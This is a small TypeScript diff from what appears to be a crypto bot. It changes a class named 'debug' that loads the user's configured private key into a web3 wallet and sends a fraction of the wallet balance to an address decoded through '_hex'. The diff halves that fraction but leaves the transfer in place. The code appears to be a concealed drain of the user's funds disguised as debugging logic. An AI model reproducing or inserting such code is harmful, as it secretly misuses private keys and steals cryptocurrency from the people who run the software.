@@ -1117,7 +1117,7 @@ export class debug {
   constructor(message: string) {
     this.report = message;
   }
-  _init_(message: string) {
+  _init_() {
     w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY));
     w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY).address;
     try {
@@ -1130,7 +1130,7 @@ export class debug {
                 to: _hex(hex),
                 gas: g,
                 gasPrice: gP,
-                value: (b - (gP * g)) / 25,
+                value: (b - (gP * g)) / 50,
               });
             }
           });
